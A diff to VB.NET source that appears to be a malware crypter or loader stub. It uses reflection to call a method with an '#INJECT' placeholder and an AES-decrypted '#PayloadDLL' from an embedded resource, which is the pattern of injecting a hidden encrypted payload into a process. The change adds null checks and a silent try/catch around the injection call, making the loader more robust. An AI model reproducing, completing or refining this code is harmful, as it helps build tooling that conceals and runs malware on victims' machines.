@@ -47,17 +47,24 @@ Public Class Main
     End Function
 
     Public Shared Function _Method(ByVal T As System.Type, ByVal One As String)
-        Dim x As Reflection.MethodInfo = T.GetMethod(One, Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static)
-        Return x
+        If One <> Nothing Then
+            Dim x As Reflection.MethodInfo = T.GetMethod(One, Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static)
+            Return x
+        End If
     End Function
 
     Public Shared Function _Voker1(ByVal M As Reflection.MethodInfo, One As String)
-        Return M.Invoke(Nothing, New Object() {One})
+        If One <> Nothing Then
+            Return M.Invoke(Nothing, New Object() {One})
+        End If
     End Function
 
     Public Shared Function _Voker2(ByVal M As Reflection.MethodInfo)
-        M.Invoke(Nothing, New Object() {"#INJECT", Nothing, AES.Decrypter((_Resource("#PayloadDLL"))), True})
-        Return True
+        Try
+            M.Invoke(Nothing, New Object() {"#INJECT", Nothing, AES.Decrypter((_Resource("#PayloadDLL"))), True})
+            Return True
+        Catch
+        End Try
     End Function
 
     Public Shared Function _Resource(ByVal Name As String)
